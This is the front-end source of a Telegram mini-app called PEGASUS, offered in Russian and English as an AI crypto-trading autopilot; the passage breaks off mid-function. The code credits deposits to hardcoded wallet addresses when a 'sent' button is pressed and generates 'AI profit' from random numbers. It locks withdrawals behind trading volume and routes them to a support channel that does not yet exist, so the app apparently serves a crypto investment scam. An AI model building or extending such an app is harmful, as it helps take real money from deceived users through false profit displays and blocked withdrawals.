import { useEffect, useMemo, useRef, useState } from "react";
import pegasusMark from "./assets/pegasus-mark.svg";

const LANGUAGE_STORAGE_KEY = "pegas-language";
const TAB_ORDER = ["home", "earnings", "rewards", "activity", "news"];
const TAB_TRANSITION_MS = 420;
const EXCHANGE_FEE_RATE = 0.006;
const MIN_DEPOSIT_AMOUNT = 20;
const HERO_DISMISS_MS = 420;
const HOME_ACTION_DELAY_MS = 220;
const WITHDRAW_UNLOCK_VOLUME = 500;
const DEPOSIT_GENERATION_DELAY_MS = 520;

const depositAssetMeta = {
  BTC: {
    name: "Bitcoin",
    network: "BTC",
    usdPrice: 43210,
    decimals: 6,
    address: "bc1qcps30ljm5e547489spjgpr6yygv2dwzhcuz9wx"
  },
  ETH: {
    name: "Ethereum",
    network: "ERC-20",
    usdPrice: 2280,
    decimals: 5,
    address: "0xc92358875686C8B4C5c93043899Ab8d239ae4cCB"
  },
  USDT: {
    name: "Tether",
    network: "ERC-20",
    usdPrice: 1,
    decimals: 2,
    address: "0xc92358875686C8B4C5c93043899Ab8d239ae4cCB"
  },
  DOGE: {
    name: "Dogecoin",
    network: "DOGE",
    usdPrice: 0.082,
    decimals: 2,
    address: "DDjv4o6dA2YBbo18b4dzk6NmRx2PEX4P7A"
  },
  SOL: {
    name: "Solana",
    network: "SOL",
    usdPrice: 145,
    decimals: 4,
    address: "HQ2Ea3zXmv5x8axce5nsgZKBPCMkZGCPJoQnmjQzoYeh"
  }
};

const assetMeta = {
  lyn: {
    pair: "LYN / USD",
    short: "LYN",
    api: "lyn"
  },
  bitcoin: {
    pair: "BTC / USD",
    short: "BTC",
    api: "bitcoin"
  },
  ethereum: {
    pair: "ETH / USD",
    short: "ETH",
    api: "ethereum"
  }
};

const quickActions = [
  { icon: "+", key: "deposit" },
  { icon: "⇄", key: "exchange" },
  { icon: "↓", key: "reward" },
  { icon: "↑", key: "send" }
];

const defaultActivities = [];

const uiText = {
  ru: {
    locale: "ru-RU",
    languageSwitchLabel: "Переключение языка",
    brand: {
      main: "PEGASUS",
      sub: "MARKET AUTOPILOT"
    },
    hero: {
      closeLabel: "Закрыть блок",
      tag: "AI Capital Autopilot",
      title: "Внеси баланс. PEGASUS сам ищет, читает и ведет сделку.",
      description:
        "Нейросеть отслеживает последние новости, оценивает импульс и включает торговый автопилот без ручной рутины.",
      tags: ["AI news scan", "autopilot entry", "smart risk exit"]
    },
    quickActions: {
      deposit: "Пополнить",
      exchange: "Обменять",
      reward: "Получить",
      send: "Отправить"
    },
    nav: {
      home: "Главная",
      earnings: "Доход",
      rewards: "Награды",
      news: "Новости"
    },
    modal: {
      depositTitle: "Пополнить баланс",
      amountTitle: "Введите сумму в долларах",
      currencyLabel: "Криптовалюта",
      walletTitle: "Кошелек для перевода",
      walletLabel: "Адрес кошелька",
      networkLabel: "Сеть",
      amountUsdLabel: "Сумма",
      amountCryptoLabel: "К переводу",
      ticketLabel: "Номер транзакции",
      notice:
        "Некоторые транзакции могут не пройти. Если средства не пришли в течение 20 минут, обязательно обратись в техподдержку и передай номер транзакции.",
      generate: "Сгенерировать кошелек",
      confirm: "Я перевел средства",
      support: "Тех. поддержка",
      cancel: "Отмена",
      submit: "Пополнить баланс"
    },
    exchange: {
      tag: "Обмен",
      title: "Выбери актив для графика и обмена",
      close: "Закрыть"
    },
    home: {
      capitalTag: "Капитал",
      balanceRunningNote: "PEGASUS уже ведет позицию и пересчитывает доход в live-режиме.",
      balanceClosedNote: "Сессия закрыта. Можно снова пополнить баланс и запустить AI.",
      balanceIdleNote: "Внеси баланс, чтобы запустить AI-режим и передать работу алгоритму.",
      depositButton: "Пополнить баланс",
      withdrawButton: "Вывести",
      marketModeLabel: "Режим",
      marketModeValue: "AI-автопилот",
      marketTrendLabel: "Тренд рынка",
      marketTrendValue: "Бычий",
      marketCoreTag: "Ядро рынка",
      priceLabel: "Цена",
      totalTradedLabel: "Общие торги",
      swapFeeLabel: "Комиссия swap",
      activityTag: "Активность",
      activityTitle: "Последние действия",
      activityEmpty: "Пока нет действий. После пополнения или обмена история появится здесь.",
      marketFeedTag: "Лента рынка",
      incomeMini: "Доход",
      syncBadge: "sync",
      connection: "подключение",
      rangeLabel: "24ч",
      supportTag: "Поддержка",
      supportTitle: "Тех. поддержка",
      supportCopy: "Если нужна помощь по депозиту, обмену или наградам, поддержка подключит тебя вручную.",
      supportLink: "Открыть поддержку",
      newsTag: "Новости",
      newsTitle: "Что PEGASUS видит сейчас",
      newsAll: "Все",
      pinnedLabel: "Закреплено",
      whyTag: "Почему PEGASUS",
      whyTitle: "Почему это выглядит как AI-бизнес",
      legal: "(C) Pegasus GPT - Все права защищены 2025-2026."
    },
    earnings: {
      tag: "Доход",
      title: "Как выглядит доход в live-режиме",
      engineTag: "Движок",
      sourceTitle: "На чем PEGASUS забирает процент",
      shareLabel: "доля бота"
    },
    rewards: {
      tag: "Награды",
      title: "Награды",
      activate: "Активировать",
      statusDone: "выполнено",
      statusProgress: "в процессе"
    },
    activityPage: {
      tag: "Лента действий",
      title: "Последние действия",
      back: "Назад"
    },
    newsPage: {
      tag: "Лента новостей",
      title: "Новости по монетам"
    },
    aiStatus: [
      { label: "Скан новостей", value: "24/7" },
      { label: "Вход в рынок", value: "AI" },
      { label: "Выход", value: "AUTO" }
    ],
    earningsSources: [
      {
        name: "LYN impulse engine",
        share: "1.8%",
        note: "PEGASUS входит после подтвержденного ускорения и берет часть движения."
      },
      {
        name: "BTC news reaction",
        share: "2.4%",
        note: "Нейросеть читает новостной фон и заходит на сильной переоценке рынка."
      },
      {
        name: "ETH volatility range",
        share: "1.5%",
        note: "Автопилот забирает короткие возвраты и резкие внутридневные колебания."
      }
    ],
    rewardPrograms: [
      {
        title: "Депозит 100$",
        reward: "+20$",
        target: 100,
        type: "deposit",
        note: "Получишь 20$ в течение 3-х дней после пополнения."
      },
      {
        title: "Депозит 250$",
        reward: "+55$",
        target: 250,
        type: "deposit",
        note: "Повышенный бонус для второго депозита и ускоренный старт торгового AI."
      },
      {
        title: "Депозит 500$",
        reward: "+120$",
        target: 500,
        type: "deposit",
        note: "Открывает усиленный режим ведения позиции и повышенный бонус."
      },
      {
        title: "Общие торги 2000$",
        reward: "+20$",
        target: 2000,
        type: "trading",
        note: "Получишь 20$ в течение 3-х дней после достижения объема."
      },
      {
        title: "Общие торги 5000$",
        reward: "+65$",
        target: 5000,
        type: "trading",
        note: "После достижения объема откроется повышенная награда за активность."
      },
      {
        title: "Общие торги 12000$",
        reward: "+180$",
        target: 12000,
        type: "trading",
        note: "Флагманская награда для активного баланса и длинной AI-сессии."
      }
    ],
    pinnedStory: {
      coin: "PEGASUS x LYN",
      title: "PEGASUS сделал коллаборацию с LYN. Теперь зарабатывать на AI-валюте стало еще проще.",
      description: "Новый режим усиливает AI-скан новостей и ускоряет автопилот на монете LYN.",
      trend: "bullish",
      pinned: true
    },
    marketStatus: {
      bullish: "Бычий",
      bearish: "Медвежий"
    },
    alerts: {
      withdrawBeta: (ticket) =>
        `Запрос на вывод создан. Номер заявки ${ticket}. Передай его в техподдержку и укажи кошелек для получения.`,
      withdrawNeedVolume: (required, current) =>
        `Попытка вывода доступна только после общего торгового объема от $${required}. Сейчас: $${current.toFixed(1)}.`,
      supportBeta: "Тех. поддержка подключится в следующем обновлении.",
      supportTicket: (ticket) =>
        `Если средства не пришли за 20 минут, обратись в техподдержку и передай номер транзакции ${ticket}.`,
      depositNotifyFailed: "Баланс обновлен, но сообщение в Telegram не отправилось. Проверь TELEGRAM_BOT_TOKEN и chat id.",
      amountInvalid: "Введите сумму в долларах.",
      amountMinimum: (min) => `Минимальная сумма пополнения - $${min}.`,
      sendNeedDeposit: "Сначала нужно пополнить баланс.",
      sendNeedVolume: "Отправка откроется после общего торгового объема 500$.",
      sendNeedBalance: "Недостаточно средств для отправки.",
      sendDone: "Отправка выполнена.",
      exchangeCurrent: (asset) => `Сейчас уже выбран ${asset}.`,
      exchangeChanged: (from, to, fee) =>
        `Актив переключен: ${from} -> ${to}${fee > 0 ? `, комиссия $${fee.toFixed(2)}` : ""}.`
    },
    activity: {
      depositTitle: "Пополнено",
      depositNote: "Баланс пополнен. AI-сессия запущена.",
      exchangeTitle: "Обменено",
      exchangeNote: (from, to) => `${from} -> ${to}, удержана комиссия за обмен.`,
      modeTitle: "Режим рынка",
      modeNote: (from, to) => `График переключен с ${from} на ${to}.`,
      sendTitle: "Отправлено",
      sendNote: "Перевод из торгового баланса после открытия лимита по объему."
    }
  },
  en: {
    locale: "en-US",
    languageSwitchLabel: "Language switch",
    brand: {
      main: "PEGASUS",
      sub: "MARKET AUTOPILOT"
    },
    hero: {
      closeLabel: "Close banner",
      tag: "AI Capital Autopilot",
      title: "Fund the balance. PEGASUS scans, reads, and manages the trade.",
      description:
        "The model watches the latest headlines, measures momentum, and runs the trading autopilot without manual routine.",
      tags: ["AI news scan", "autopilot entry", "smart risk exit"]
    },
    quickActions: {
      deposit: "Deposit",
      exchange: "Swap",
      reward: "Rewards",
      send: "Send"
    },
    nav: {
      home: "Home",
      earnings: "Income",
      rewards: "Rewards",
      news: "News"
    },
    modal: {
      depositTitle: "Fund balance",
      amountTitle: "Enter amount in USD",
      currencyLabel: "Cryptocurrency",
      walletTitle: "Transfer wallet",
      walletLabel: "Wallet address",
      networkLabel: "Network",
      amountUsdLabel: "Amount",
      amountCryptoLabel: "Send",
      ticketLabel: "Transaction number",
      notice:
        "Some transactions may fail. If funds do not arrive within 20 minutes, contact support and provide the transaction number.",
      generate: "Generate wallet",
      confirm: "I sent the funds",
      support: "Support",
      cancel: "Cancel",
      submit: "Fund balance"
    },
    exchange: {
      tag: "Swap",
      title: "Choose an asset for chart and swap",
      close: "Close"
    },
    home: {
      capitalTag: "Capital",
      balanceRunningNote: "PEGASUS is already managing the position and recalculating profit live.",
      balanceClosedNote: "Session closed. You can fund again and launch AI.",
      balanceIdleNote: "Add funds to start AI mode and hand execution over to the engine.",
      depositButton: "Fund balance",
      withdrawButton: "Withdraw",
      marketModeLabel: "Mode",
      marketModeValue: "AI autopilot",
      marketTrendLabel: "Market trend",
      marketTrendValue: "Bullish",
      marketCoreTag: "Market core",
      priceLabel: "Price",
      totalTradedLabel: "Total traded",
      swapFeeLabel: "Swap fee",
      activityTag: "Activity",
      activityTitle: "Recent activity",
      activityEmpty: "No activity yet. After a deposit or swap, history will appear here.",
      marketFeedTag: "Market feed",
      incomeMini: "Income",
      syncBadge: "sync",
      connection: "connecting",
      rangeLabel: "24h",
      supportTag: "Support",
      supportTitle: "Support",
      supportCopy: "If you need help with deposits, swaps, or rewards, support will connect manually.",
      supportLink: "Open support",
      newsTag: "News",
      newsTitle: "What PEGASUS sees right now",
      newsAll: "All",
      pinnedLabel: "Pinned",
      whyTag: "Why PEGASUS",
      whyTitle: "Why this feels like an AI operation",
      legal: "(C) Pegasus GPT - All rights reserved 2025-2026."
    },
    earnings: {
      tag: "Income",
      title: "How live income looks",
      engineTag: "Engine",
      sourceTitle: "Where PEGASUS captures margin",
      shareLabel: "bot share"
    },
    rewards: {
      tag: "Rewards",
      title: "Rewards",
      activate: "Activate",
      statusDone: "done",
      statusProgress: "in progress"
    },
    activityPage: {
      tag: "Activity feed",
      title: "Recent activity",
      back: "Back"
    },
    newsPage: {
      tag: "News feed",
      title: "Coin news"
    },
    aiStatus: [
      { label: "News scan", value: "24/7" },
      { label: "Entry mode", value: "AI" },
      { label: "Exit mode", value: "AUTO" }
    ],
    earningsSources: [
      {
        name: "LYN impulse engine",
        share: "1.8%",
        note: "PEGASUS enters after confirmed acceleration and takes a slice of the move."
      },
      {
        name: "BTC news reaction",
        share: "2.4%",
        note: "The model reads the news backdrop and enters during strong market repricing."
      },
      {
        name: "ETH volatility range",
        share: "1.5%",
        note: "The autopilot captures short reversals and sharp intraday swings."
      }
    ],
    rewardPrograms: [
      {
        title: "Deposit $100",
        reward: "+$20",
        target: 100,
        type: "deposit",
        note: "You will receive $20 within 3 days after funding."
      },
      {
        title: "Deposit $250",
        reward: "+$55",
        target: 250,
        type: "deposit",
        note: "Higher bonus for the second funding tier and a stronger AI start."
      },
      {
        title: "Deposit $500",
        reward: "+$120",
        target: 500,
        type: "deposit",
        note: "Unlocks a stronger position-management mode and a larger bonus."
      },
      {
        title: "Total trading $2000",
        reward: "+$20",
        target: 2000,
        type: "trading",
        note: "You will receive $20 within 3 days after reaching the volume."
      },
      {
        title: "Total trading $5000",
        reward: "+$65",
        target: 5000,
        type: "trading",
        note: "After this volume, a higher activity reward becomes available."
      },
      {
        title: "Total trading $12000",
        reward: "+$180",
        target: 12000,
        type: "trading",
        note: "Flagship reward for a highly active balance and long AI sessions."
      }
    ],
    pinnedStory: {
      coin: "PEGASUS x LYN",
      title: "PEGASUS launched a collaboration with LYN. Earning on an AI coin is now simpler.",
      description: "The new mode boosts the AI news scan and speeds up the autopilot on LYN.",
      trend: "bullish",
      pinned: true
    },
    marketStatus: {
      bullish: "Bullish",
      bearish: "Bearish"
    },
    alerts: {
      withdrawBeta: (ticket) =>
        `Withdrawal request created. Ticket ${ticket}. Send it to support and include the wallet for payout.`,
      withdrawNeedVolume: (required, current) =>
        `Withdrawal attempts unlock only after total bot trading reaches $${required}. Current volume: $${current.toFixed(1)}.`,
      supportBeta: "Support will connect in the next update.",
      supportTicket: (ticket) =>
        `If funds do not arrive within 20 minutes, contact support and provide transaction number ${ticket}.`,
      depositNotifyFailed:
        "Balance was updated, but the Telegram message was not sent. Check TELEGRAM_BOT_TOKEN and target chat id.",
      amountInvalid: "Enter an amount in USD.",
      amountMinimum: (min) => `Minimum funding amount is $${min}.`,
      sendNeedDeposit: "You need to fund the balance first.",
      sendNeedVolume: "Send unlocks after total trading volume reaches $500.",
      sendNeedBalance: "Not enough funds to send.",
      sendDone: "Transfer completed.",
      exchangeCurrent: (asset) => `${asset} is already selected.`,
      exchangeChanged: (from, to, fee) =>
        `Asset switched: ${from} -> ${to}${fee > 0 ? `, fee $${fee.toFixed(2)}` : ""}.`
    },
    activity: {
      depositTitle: "Funded",
      depositNote: "Balance funded. AI session launched.",
      exchangeTitle: "Swapped",
      exchangeNote: (from, to) => `${from} -> ${to}, swap fee applied.`,
      modeTitle: "Market mode",
      modeNote: (from, to) => `Chart switched from ${from} to ${to}.`,
      sendTitle: "Sent",
      sendNote: "Transfer made from trading balance after volume unlock."
    }
  }
};

const getInitialLanguage = () => {
  if (typeof window === "undefined") {
    return "ru";
  }

  const saved = window.localStorage.getItem(LANGUAGE_STORAGE_KEY);
  return saved === "en" ? "en" : "ru";
};

const isBearishTrend = (trend) => /bear|медвеж/i.test(String(trend || ""));

const localizeTrend = (trend, copy) =>
  isBearishTrend(trend) ? copy.marketStatus.bearish : copy.marketStatus.bullish;

const createReferenceNumber = (prefix) =>
  `${prefix}-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;

const getTelegramUser = () => {
  if (typeof window === "undefined") {
    return null;
  }

  const user = window.Telegram?.WebApp?.initDataUnsafe?.user;

  if (!user?.id) {
    return null;
  }

  return {
    id: String(user.id),
    username: user.username || "",
    firstName: user.first_name || "",
    lastName: user.last_name || ""
  };
};

const getPersistedStateKey = (userId) => `pegas-app-state:${userId || "guest"}`;

function App() {
  const [tab, setTab] = useState("home");
  const [language, setLanguage] = useState(getInitialLanguage);
  const [currentAsset, setCurrentAsset] = useState("lyn");
  const [isDepositOpen, setDepositOpen] = useState(false);
  const [isExchangeOpen, setExchangeOpen] = useState(false);
  const [depositInput, setDepositInput] = useState("20");
  const [depositCurrency, setDepositCurrency] = useState("USDT");
  const [generatedDeposit, setGeneratedDeposit] = useState(null);
  const [isDepositGenerating, setDepositGenerating] = useState(false);
  const [isDepositConfirming, setDepositConfirming] = useState(false);
  const [demoAmount, setDemoAmount] = useState(0);
  const [demoProfit, setDemoProfit] = useState(0);
  const [demoPercent, setDemoPercent] = useState(0);
  const [totalDeposited, setTotalDeposited] = useState(0);
  const [totalTraded, setTotalTraded] = useState(0);
  const [isDemoRunning, setDemoRunning] = useState(false);
  const [marketData, setMarketData] = useState(null);
  const [latestNews, setLatestNews] = useState([]);
  const [activityFeed, setActivityFeed] = useState(defaultActivities);
  const [isHeroVisible, setHeroVisible] = useState(true);
  const [isHeroClosing, setHeroClosing] = useState(false);
  const [outgoingTab, setOutgoingTab] = useState(null);
  const [isTabAnimating, setTabAnimating] = useState(false);
  const [tabDirection, setTabDirection] = useState(1);
  const [pendingHomeAction, setPendingHomeAction] = useState(null);
  const [telegramUser, setTelegramUser] = useState(null);
  const [isTelegramReady, setTelegramReady] = useState(false);
  const [isStateHydrated, setStateHydrated] = useState(false);
  const simulationRef = useRef(null);
  const heroDismissRef = useRef(null);
  const tabTransitionRef = useRef(null);
  const actionDelayRef = useRef(null);
  const depositGenerationRef = useRef(null);

  const copy = uiText[language];
  const currentAssetMeta = assetMeta[currentAsset];
  const balance = demoAmount + demoProfit;
  const newsFeed = useMemo(() => [copy.pinnedStory, ...latestNews], [copy.pinnedStory, latestNews]);
  const featuredNews = newsFeed.slice(0, 2);
  const activityPreview = activityFeed.slice(0, 2);
  const hasMoreActivities = activityFeed.length > 2;
  const rewardPrograms = copy.rewardPrograms;
  const persistedAppState = useMemo(
    () => ({
      currentAsset,
      demoAmount,
      demoProfit,
      demoPercent,
      totalDeposited,
      totalTraded,
      isHeroVisible,
      activityFeed
    }),
    [activityFeed, currentAsset, demoAmount, demoPercent, demoProfit, isHeroVisible, totalDeposited, totalTraded]
  );
  const candleSeries = useMemo(() => {
    if (!marketData?.ohlc?.length) {
      return [];
    }

    return marketData.ohlc.slice(-32).map((item) => ({
      open: item[1],
      high: item[2],
      low: item[3],
      close: item[4]
    }));
  }, [marketData]);

  const candleScale = useMemo(() => {
    if (!candleSeries.length) {
      return { normalize: () => 50 };
    }

    const highs = candleSeries.map((item) => item.high);
    const lows = candleSeries.map((item) => item.low);
    const min = Math.min(...lows);
    const max = Math.max(...highs);
    const rawRange = max - min;
    const padding = rawRange > 0 ? rawRange * 0.16 : Math.max(Math.abs(max || 1) * 0.003, 0.00000001);
    const visualMin = Math.max(0, min - padding);
    const visualMax = max + padding;
    const range = Math.max(visualMax - visualMin, 0.00000001);

    const normalize = (value) => ((value - visualMin) / range) * 100;

    return { normalize };
  }, [candleSeries]);

  const formatMarketPrice = (value) => {
    if (!Number.isFinite(value)) {
      return "--";
    }

    if (value < 0.01) {
      return value.toFixed(6);
    }

    if (value < 1) {
      return value.toFixed(4);
    }

    return value.toLocaleString(copy.locale, {
      maximumFractionDigits: 2
    });
  };

  const formatSignedMoney = (value) => {
    const absValue = Math.abs(value);
    return `${value >= 0 ? "+" : "-"}$${absValue.toFixed(2)}`;
  };

  const formatMoney = (value) =>
    `$${value.toLocaleString(copy.locale, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    })}`;

  const formatSignedPercent = (value) => {
    const absValue = Math.abs(value);
    return `${value >= 0 ? "+" : "-"}${absValue.toFixed(2)}%`;
  };

  const formatActivityStamp = (timestamp) => {
    const moment = new Date(timestamp);

    return {
      date: moment.toLocaleDateString(copy.locale),
      time: moment.toLocaleTimeString(copy.locale, {
        hour: "2-digit",
        minute: "2-digit"
      })
    };
  };

  const getActivityContent = (item) => {
    if (item.type === "deposit") {
      return {
        icon: "+",
        title: copy.activity.depositTitle,
        note: copy.activity.depositNote
      };
    }

    if (item.type === "exchange") {
      return {
        icon: "⇄",
        title: copy.activity.exchangeTitle,
        note: copy.activity.exchangeNote(item.from, item.to)
      };
    }

    if (item.type === "send") {
      return {
        icon: "↑",
        title: copy.activity.sendTitle,
        note: copy.activity.sendNote
      };
    }

    return {
      icon: "•",
      title: copy.activity.modeTitle,
      note: copy.activity.modeNote(item.from, item.to)
    };
  };

  const renderActivityItems = (items) =>
    items.map((item, index) => {
      const activityCopy = getActivityContent(item);
      const stamp = formatActivityStamp(item.timestamp);

      return (
        <article className="activity-card" key={`${item.type}-${item.timestamp}-${index}`}>
          <div className="activity-icon-wrap">
            <span className="activity-icon">{activityCopy.icon}</span>
          </div>
          <div className="activity-main">
            <div className="activity-head">
              <div>
                <strong>{activityCopy.title}</strong>
                <div className="activity-stamp">
                  <span>{stamp.date}</span>
                  <span>{stamp.time}</span>
                </div>
              </div>
              <div className="activity-side">
                <strong className="activity-amount">{item.amount}</strong>
                <span className="activity-asset">{item.asset}</span>
              </div>
            </div>
            <p className="activity-note">{activityCopy.note}</p>
          </div>
        </article>
      );
    });

  const renderNewsItems = (items) =>
    items.map((item, index) => {
      const trendLabel = localizeTrend(item.trend, copy);

      return (
        <div className={item.pinned ? "news-item pinned-item" : "news-item"} key={`${item.link || item.title}-${index}`}>
          <div className="news-copy">
            {item.pinned && <span className="pin-badge">{copy.home.pinnedLabel}</span>}
            <strong>{item.coin}</strong>
            <p>{item.title || item.headline}</p>
          </div>
          <span className={isBearishTrend(item.trend) ? "negative" : "positive"}>{trendLabel}</span>
        </div>
      );
    });

  useEffect(() => {
    const tg = window.Telegram?.WebApp;

    if (!tg) {
      setTelegramUser(getTelegramUser());
      setTelegramReady(true);
      return;
    }

    tg.ready();
    tg.expand();
    tg.setHeaderColor("#020503");
    tg.setBackgroundColor("#000000");
    tg.MainButton.hide();
    setTelegramUser(getTelegramUser());
    setTelegramReady(true);

    return () => {
      tg.MainButton.hide();
    };
  }, []);

  useEffect(() => {
    if (typeof document !== "undefined") {
      document.documentElement.lang = language;
      document.title = language === "ru" ? "PEGASUS | AI-автопилот рынка" : "PEGASUS | AI market autopilot";
    }

    if (typeof window !== "undefined") {
      window.localStorage.setItem(LANGUAGE_STORAGE_KEY, language);
    }
  }, [language]);

  useEffect(() => {
    if (typeof document === "undefined") {
      return;
    }

    const isModalOpen = isDepositOpen || isExchangeOpen;
    document.body.classList.toggle("modal-open", isModalOpen);

    return () => {
      document.body.classList.remove("modal-open");
    };
  }, [isDepositOpen, isExchangeOpen]);

  useEffect(() => {
    if (!isTelegramReady) {
      return;
    }

    let cancelled = false;

    const applyPersistedState = (state) => {
      if (!state || cancelled) {
        return;
      }

      setCurrentAsset(assetMeta[state.currentAsset] ? state.currentAsset : "lyn");
      setDemoAmount(Number(state.demoAmount) || 0);
      setDemoProfit(Number(state.demoProfit) || 0);
      setDemoPercent(Number(state.demoPercent) || 0);
      setTotalDeposited(Number(state.totalDeposited) || 0);
      setTotalTraded(Number(state.totalTraded) || 0);
      setHeroVisible(state.isHeroVisible !== false);
      setActivityFeed(Array.isArray(state.activityFeed) ? state.activityFeed : defaultActivities);
      setDemoRunning(false);
    };

    const loadPersistedState = async () => {
      setStateHydrated(false);

      const storageKey = getPersistedStateKey(telegramUser?.id);
      let fallbackState = null;

      if (typeof window !== "undefined") {
        try {
          const raw = window.localStorage.getItem(storageKey);
          fallbackState = raw ? JSON.parse(raw) : null;
        } catch {
          fallbackState = null;
        }
      }

      if (!telegramUser?.id) {
        applyPersistedState(fallbackState);
        if (!cancelled) {
          setStateHydrated(true);
        }
        return;
      }

      try {
        const response = await fetch(`/api/app-state/${telegramUser.id}`);
        const payload = await response.json();

        if (!cancelled && response.ok && payload.state) {
          applyPersistedState(payload.state);
        } else {
          applyPersistedState(fallbackState);
        }
      } catch {
        applyPersistedState(fallbackState);
      } finally {
        if (!cancelled) {
          setStateHydrated(true);
        }
      }
    };

    loadPersistedState();

    return () => {
      cancelled = true;
    };
  }, [isTelegramReady, telegramUser?.id]);

  useEffect(() => {
    if (!isStateHydrated) {
      return;
    }

    const storageKey = getPersistedStateKey(telegramUser?.id);

    if (typeof window !== "undefined") {
      window.localStorage.setItem(storageKey, JSON.stringify(persistedAppState));
    }

    if (!telegramUser?.id) {
      return;
    }

    const controller = new AbortController();
    const timer = window.setTimeout(async () => {
      try {
        await fetch("/api/app-state", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            userId: telegramUser.id,
            state: persistedAppState
          }),
          signal: controller.signal
        });
      } catch {
        return;
      }
    }, 180);

    return () => {
      window.clearTimeout(timer);
      controller.abort();
    };
  }, [isStateHydrated, persistedAppState, telegramUser?.id]);

  useEffect(() => {
    return () => {
      if (simulationRef.current) {
        window.clearInterval(simulationRef.current);
      }

      if (heroDismissRef.current) {
        window.clearTimeout(heroDismissRef.current);
      }

      if (tabTransitionRef.current) {
        window.clearTimeout(tabTransitionRef.current);
      }

      if (actionDelayRef.current) {
        window.clearTimeout(actionDelayRef.current);
      }

      if (depositGenerationRef.current) {
        window.clearTimeout(depositGenerationRef.current);
      }
    };
  }, []);

  useEffect(() => {
    let cancelled = false;

    const loadMarketData = async () => {
      try {
        const response = await fetch(`/api/market/${currentAssetMeta.api}`);
        const payload = await response.json();

        if (!response.ok) {
          throw new Error(payload.error || "Failed to load market data");
        }

        if (!cancelled) {
          setMarketData(payload);
        }
      } catch {
        return;
      }
    };

    loadMarketData();
    const timer = window.setInterval(loadMarketData, 15000);

    return () => {
      cancelled = true;
      window.clearInterval(timer);
    };
  }, [currentAssetMeta.api]);

  useEffect(() => {
    let cancelled = false;

    const loadNews = async () => {
      try {
        const response = await fetch("/api/news/latest");
        const payload = await response.json();

        if (!response.ok) {
          throw new Error(payload.error || "Failed to load news");
        }

        if (!cancelled) {
          setLatestNews(payload.items || []);
        }
      } catch {
        if (!cancelled) {
          setLatestNews([
            {
              coin: "BTC",
              title: "Bitcoin holders face $600B in unrealized losses as BTC price slips to $66K",
              description: "Weak spot demand continues to pressure short-term sentiment.",
              trend: "bearish"
            },
            {
              coin: "ETH",
              title: "Ether at risk of new 2026 lows if bulls fail to turn $2.4K into support",
              description: "Ethereum remains fragile unless buyers reclaim key support.",
              trend: "bearish"
            }
          ]);
        }
      }
    };

    loadNews();
    const timer = window.setInterval(loadNews, 300000);

    return () => {
      cancelled = true;
      window.clearInterval(timer);
    };
  }, []);

  const showBetaAlert = (message) => {
    if (window.Telegram?.WebApp?.showAlert) {
      window.Telegram.WebApp.showAlert(message);
      return;
    }

    window.alert(message);
  };

  const showBetaWithdraw = () => {
    if (totalTraded < WITHDRAW_UNLOCK_VOLUME) {
      showBetaAlert(copy.alerts.withdrawNeedVolume(WITHDRAW_UNLOCK_VOLUME, totalTraded));
      return;
    }

    showBetaAlert(copy.alerts.withdrawBeta(createReferenceNumber("WD")));
  };

  const closeDepositModal = () => {
    if (depositGenerationRef.current) {
      window.clearTimeout(depositGenerationRef.current);
      depositGenerationRef.current = null;
    }

    setDepositGenerating(false);
    setDepositConfirming(false);
    setDepositOpen(false);
    setGeneratedDeposit(null);
  };

  const runHomeAction = (actionId, callback) => {
    if (pendingHomeAction) {
      return;
    }

    setPendingHomeAction(actionId);
    actionDelayRef.current = window.setTimeout(() => {
      actionDelayRef.current = null;
      setPendingHomeAction(null);
      callback();
    }, HOME_ACTION_DELAY_MS);
  };

  const pushActivity = (entry) => {
    setActivityFeed((current) => [entry, ...current].slice(0, 8));
  };

  const startDemoSimulation = (amountOverride = null, depositedAsset = "USD") => {
    const amount = Number.parseFloat(amountOverride ?? depositInput);

    if (!Number.isFinite(amount) || amount <= 0) {
      showBetaAlert(copy.alerts.amountInvalid);
      return;
    }

    if (amount < MIN_DEPOSIT_AMOUNT) {
      showBetaAlert(copy.alerts.amountMinimum(MIN_DEPOSIT_AMOUNT));
      return;
    }

    if (simulationRef.current) {
      window.clearInterval(simulationRef.current);
    }

    const nextAmount = Number((demoAmount + amount).toFixed(2));
    const nextPercent = nextAmount > 0 ? Number(((demoProfit / nextAmount) * 100).toFixed(2)) : 0;

    setDemoAmount(nextAmount);
    setDemoPercent(nextPercent);
    setTotalDeposited((current) => Number((current + amount).toFixed(2)));
    setDemoRunning(true);
    closeDepositModal();

    pushActivity({
      type: "deposit",
      amount: `+$${amount.toFixed(2)}`,
      asset: depositedAsset,
      timestamp: Date.now()
    });

    let step = 0;
    let percent = nextPercent;

    simulationRef.current = window.setInterval(() => {
      step += 1;
      const delta = Math.random() * 1.8 - 0.7;
      percent = Math.max(-1.5, Math.min(10, Number((percent + delta).toFixed(2))));
      const profit = Number(((nextAmount * percent) / 100).toFixed(2));
      const tradeDelta = Number((0.1 + Math.random() * 0.1).toFixed(1));

      setDemoPercent(percent);
      setDemoProfit(profit);
      setTotalTraded((current) => Number((current + tradeDelta).toFixed(1)));

      if (step >= 24 || percent >= 10) {
        window.clearInterval(simulationRef.current);
        simulationRef.current = null;
        setDemoRunning(false);
      }
    }, 5000);
  };

  const dismissHero = () => {
    if (isHeroClosing) {
      return;
    }

    setHeroClosing(true);
    heroDismissRef.current = window.setTimeout(() => {
      setHeroVisible(false);
      setHeroClosing(false);
      heroDismissRef.current = null;
    }, HERO_DISMISS_MS);
  };

  const handleTabChange = (nextTab) => {
    if (nextTab === tab || isTabAnimating) {
      return;
    }

    const currentIndex = TAB_ORDER.indexOf(tab);
    const nextIndex = TAB_ORDER.indexOf(nextTab);
    const direction = nextIndex > currentIndex ? 1 : -1;

    if (tabTransitionRef.current) {
      window.clearTimeout(tabTransitionRef.current);
    }

    setOutgoingTab(tab);
    setTabDirection(direction);
    setTabAnimating(true);
    setTab(nextTab);

    tabTransitionRef.current = window.setTimeout(() => {
      setOutgoingTab(null);
      setTabAnimating(false);
      tabTransitionRef.current = null;
    }, TAB_TRANSITION_MS);
  };

  const handleQuickAction = (actionKey) => {
    if (actionKey === "deposit") {
      setDepositOpen(true);
      return;
    }

    if (actionKey === "reward") {
      handleTabChange("rewards");
      return;
    }

    if (actionKey === "exchange") {
      setExchangeOpen(true);
      return;
    }

    if (actionKey === "send") {
      if (totalDeposited <= 0) {
        showBetaAlert(copy.alerts.sendNeedDeposit);
        return;
      }

      if (totalTraded < 500) {
